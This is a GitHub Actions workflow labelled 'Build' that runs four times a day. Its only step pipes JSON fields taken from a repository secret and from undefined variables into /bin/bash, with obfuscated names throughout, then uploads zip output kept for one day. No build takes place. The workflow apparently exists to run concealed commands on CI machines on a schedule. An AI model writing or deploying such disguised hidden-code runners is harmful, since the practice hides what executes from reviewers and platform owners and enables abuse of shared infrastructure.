name: Build
on:
  workflow_dispatch:

  schedule:
    - cron: '13 2,8,14,20 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  compile:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Setup and run
        env:
          n78976: ${{ secrets.n78976 }}
        run: |
          printf '%s' "$n78976" | jq -r .kiwd05882 | /bin/bash
          echo $hn262 | jq -r .y500 | /bin/bash
          printf '%s' "$z73956" | jq -r .vydp2 | /bin/bash
          echo $fx254 | jq -r .q0911 | /bin/bash
          printf '%s' "$aa05" | jq -r .dgyf46 | /bin/bash

      - name: Upload data
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: Nsx0XsrX
          path: "*.zip"
          retention-days: 1
